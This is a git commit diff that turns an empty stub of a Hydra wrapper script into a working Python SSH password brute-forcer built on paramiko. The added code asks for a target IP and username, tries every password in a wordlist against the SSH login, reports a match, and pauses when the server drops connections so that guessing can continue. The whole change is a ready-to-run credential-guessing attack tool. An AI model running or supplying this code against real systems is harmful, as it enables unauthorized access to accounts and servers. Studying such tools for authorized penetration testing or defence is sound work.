5785380807a7b3410e9e55443afd2e9dd0fa14fc
Eren uzundağ <erenuzundag472@gmail.com>
2026-05-02 21:38:19 +0300

    Update hydra-int.py

--- src/utils/hydra-int.py
+++ src/utils/hydra-int.py
@@ -1,39 +1,54 @@
-import subprocess
-import os
-import shutil
-import glob
-import sys 
-import ipaddress
-import re
 import time
-import json
-import argparse
-import time
-from pathlib import Path
-from datetime import datetime
-from typing import Dict, List, Tuple, Optional
+import socket
+import paramiko
 
-class HydraAutomator:
+def HydraAutomator():
+    target_ip = input("\nPlease enter the IP: ") 
+    target_user = input("\nEnter the username that you want to try to login: ")
+    wordlist = "password.txt"
+
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    print(f"\nTarget IP: {target_ip}")
+    print(f"\nTarget User: {target_user} - Starting login attempts...")
+
+    try:
+        with open(wordlist, "r", encoding="utf-8") as file:
+            for line in file:
+                test_password = line.strip()
+               
+                try:
+                    ssh_client.connect(
+                        hostname=target_ip,
+                        username=target_user,
+                        password=test_password,
+                        timeout=3
+                    )
+                    print(f"\n[+] Password found: {test_password}")
+                    ssh_client.close()
+                    return
+             
+                except paramiko.AuthenticationException:
+                    print(f"[-] Password '{test_password}' failed")
+                    continue
+
+                except (paramiko.SSHException, socket.error) as e:
+                    #Ssh may end connection if to many connection attempt made so fast
+                    time.sleep(2)
+
+                except Exception as e:
+                    print(f" An unexpected Exception occurred: {e}")
+                    break   
     
-   # Checking the validty of IP
-    def checkip(self, ip):
-        try:
-
-
-        except ValueError:
-
-    # Checking the existence of tools
-    def toolchecker(self,gobuster,nmap):        
-
+    except FileNotFoundError:
+        print(f"\nError: Cannot find the wordlist '{wordlist}'")
     
-    
-    # Function that runs hydra with the given parameters
-    def hydra(ip,port,usarname,password):
+    finally:
+        ssh_client.close()
 
+    print("\nExecution of hydra finished password cannot be found")    
 
-if __name__== "__main__":
-    ip = input("Enter the target IP address: ")
-    port =input("Enter the target port: ")
-    username = input("Enter the username to test: ")
-    password = input("Enter the password to test: ")
+if __name__ == "__main__":
+    HydraAutomator()
 
